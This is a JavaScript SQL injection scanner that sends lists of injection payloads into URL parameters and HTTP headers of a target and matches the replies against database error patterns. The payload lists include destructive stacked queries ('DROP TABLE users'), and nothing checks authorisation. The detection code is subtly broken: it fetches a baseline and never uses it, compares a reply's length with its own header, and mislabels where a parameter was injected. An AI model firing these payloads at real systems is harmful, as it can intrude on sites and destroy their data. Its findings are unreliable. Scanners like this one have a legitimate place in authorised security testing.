/**
 * SQL Injection Scanner
 * Detects SQL injection vulnerabilities in web applications
 */

const axios = require('axios');

// Common SQL error patterns
const SQL_ERROR_PATTERNS = [
  // MySQL
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /You have an error in your SQL syntax/i,
  /MySQL server version/i,
  /on line \d+/i,
  
  // PostgreSQL
  /PostgreSQL.*ERROR/i,
  /pg_fetch/i,
  /psql.*ERROR/i,
  /PG::Error/i,
  /ERROR:\s+syntax error at or near/i,
  
  // Oracle
  /ORA-\d{5}/i,
  /oracle.*error/i,
  /Microsoft OLE DB Provider for Oracle/i,
  
  // SQL Server
  /Microsoft SQL Server/i,
  /SQLServer.*Error/i,
  /Unclosed quotation mark/i,
  /mssql_query/i,
  /SqlException/i,
  /System.Data.SqlClient/i,
  
  // SQLite
  /SQLite.*Error/i,
  /sqlite3\.\w+\(\)/i,
  /unrecognized token/i,
  /SQLITE_MISUSE/i,
  
  // General
  /SQL syntax/i,
  /syntax error/i,
  /invalid query/i,
  /Query failed/i,
  /Database error/i,
  /Warning.*mysql/i,
  /Warning.*mysqli/i,
  /Warning.*pg_/i,
  /ODBCSQL/i,
  /Syntax error or access violation/i,
  /Unquoted string beyond end of SQL/i,
  /java\.sql\.SQL/i
];

// SQL Injection payloads
const PAYLOADS = [
  // Error-based injection
  "'",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "' OR '1'='1'/*",
  "admin'--",
  "admin' #",
  "') OR ('1'='1",
  "') OR ('1'='1'--",
  '") OR ("1"="1',
  '") OR ("1"="1"--',
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
  
  // Union-based injection
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT 1--",
  "' UNION SELECT 1,2--",
  "' UNION SELECT 1,2,3--",
  
  // Boolean-based
  "' AND 1=1--",
  "' AND 1=2--",
  "1' AND 1=1--",
  "1' AND 1=2--",
  
  // Stacked queries
  "'; SELECT * FROM users--",
  "'; DROP TABLE users--"
];

// Common vulnerable parameters
const VULNERABLE_PARAMS = [
  'id', 'q', 'query', 'search', 'page', 'view', 'file', 'dir',
  'path', 'url', 'action', 'controller', 'module', 'code', 'num',
  'category', 'product', 'item', 'order', 'sort', 'filter', 'debug',
  'token', 'user', 'name', 'email', 'password', 'date', 'from', 'to',
  'start', 'end', 'limit', 'offset', 'ref', 'referrer', 'src', 'dest'
];

// SQL injection detection in headers
const HEADER_PAYLOADS = [
  "1' OR '1'='1",
  "' OR '1'='1'--",
  "admin'--",
  "1; DROP TABLE users--"
];

/**
 * Check if response contains SQL error
 */
function containsSQLError(text) {
  if (!text) return false;
  return SQL_ERROR_PATTERNS.some(pattern => pattern.test(text));
}

/**
 * Calculate content length differential
 */
function hasSignificantContentDiff(originalLength, newLength) {
  const threshold = originalLength * 0.2; // 20% difference
  return Math.abs(originalLength - newLength) > threshold;
}

/**
 * Test a single parameter with payload
 */
async function testParameter(url, method, paramName, paramValue, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    let testUrl = url;
    let testBody = null;
    let headers = {};

    const modifiedPayload = paramValue + payload;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, modifiedPayload);
      testUrl = urlObj.toString();
    } else {
      testBody = { [paramName]: modifiedPayload };
    }

    const response = await axios({
      method,
      url: testUrl,
      data: testBody,
      headers,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true // Accept all status codes
    });

    clearTimeout(timeout);

    const responseText = typeof response.data === 'string' 
      ? response.data 
      : JSON.stringify(response.data);

    // Check for SQL errors
    if (containsSQLError(responseText)) {
      return {
        vulnerable: true,
        type: 'error',
        payload,
        param: paramName,
        location: paramValue ? 'body' : 'query',
        confidence: 'high',
        evidence: responseText.substring(0, 500)
      };
    }

    // Check for content length differential
    if (response.headers['content-length'] && 
        hasSignificantContentDiff(
          parseInt(response.headers['content-length']) || 0,
          responseText.length
        )) {
      return {
        vulnerable: true,
        type: 'differential',
        payload,
        param: paramName,
        location: paramValue ? 'body' : 'query',
        confidence: 'medium',
        evidence: 'Content length changed significantly'
      };
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Test headers for SQL injection
 */
async function testHeaders(url, method, headersToTest) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    for (const headerName of headersToTest) {
      for (const payload of HEADER_PAYLOADS) {
        const headers = { [headerName]: payload };

        const response = await axios({
          method,
          url,
          headers,
          timeout: 10000,
          signal: controller.signal,
          validateStatus: () => true
        });

        const responseText = typeof response.data === 'string'
          ? response.data
          : JSON.stringify(response.data);

        if (containsSQLError(responseText)) {
          clearTimeout(timeout);
          return {
            vulnerable: true,
            type: 'header-injection',
            payload,
            param: headerName,
            location: 'header',
            confidence: 'high',
            evidence: responseText.substring(0, 500)
          };
        }
      }
    }

    clearTimeout(timeout);
    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Main scan function
 */
async function scan(target) {
  const { url, params, method = 'GET' } = target;
  
  const results = {
    vulnerable: false,
    vulnerabilities: [],
    tested: { params: 0, headers: 0 }
  };

  // Get baseline response
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);
  
  let baselineResponse;
  try {
    baselineResponse = await axios({
      method,
      url,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });
  } catch (e) {
    clearTimeout(timeout);
    return {
      success: false,
      error: 'Failed to reach target',
      vulnerable: false
    };
  }
  clearTimeout(timeout);

  // Find parameters to test
  const paramsToTest = Object.keys(params).length > 0 
    ? Object.keys(params)
    : VULNERABLE_PARAMS;

  // Test each parameter
  for (const paramName of paramsToTest) {
    const paramValue = params[paramName] || '';
    results.tested.params++;

    for (const payload of PAYLOADS) {
      const result = await testParameter(url, method, paramName, paramValue, payload);
      
      if (result.vulnerable) {
        results.vulnerable = true;
        results.vulnerabilities.push(result);
        
        // Return first high confidence finding
        if (result.confidence === 'high') {
          return {
            success: true,
            ...results
          };
        }
      }
    }
  }

  // Test headers
  const headersToTest = ['X-Forwarded-For', 'User-Agent', 'X-Real-IP', 'CF-Connecting-IP'];
  const headerResult = await testHeaders(url, method, headersToTest);
  results.tested.headers = headersToTest.length;

  if (headerResult.vulnerable) {
    results.vulnerable = true;
    results.vulnerabilities.push(headerResult);
  }

  return {
    success: true,
    ...results
  };
}

module.exports = { scan };